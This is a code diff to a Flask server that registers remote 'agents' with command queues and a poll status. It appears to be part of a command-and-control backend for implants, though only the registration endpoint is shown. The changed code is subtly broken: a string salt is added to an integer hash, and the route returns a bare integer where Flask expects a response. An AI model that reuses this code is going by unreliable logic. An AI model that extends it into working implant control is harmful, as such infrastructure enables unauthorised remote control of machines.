@@ -14,21 +14,24 @@ app = Flask(__name__)
 agent_db = {}
 
 
-def register_agent(pid: str):
+def register_agent(uname, salt):
 	global agent_db
 	base = {
-		"uname": "",
+		"uname": uname,
 		"commands": [],
-		"poll": ""
-
+		"poll": "active"
 	}
-	agent_db[pid] = base
+	pid = int(hashlib.sha1(uname.encode("utf-8")).hexdigest(), 16) + salt
+	if pid not in agent_db:
+		agent_db[pid] = base
+	else:
+		print("Agent already registered")
 
 
 @app.post("/register")
 def register():
-	pid = str(base64.urlsafe_b64decode(bytes(request.data)), 'utf-8')
-	register_agent(pid)
+	uname, salt = str(base64.urlsafe_b64decode(bytes(request.data)), 'utf-8').split(":")
+	register_agent(uname, salt)
 	return 200
 
 
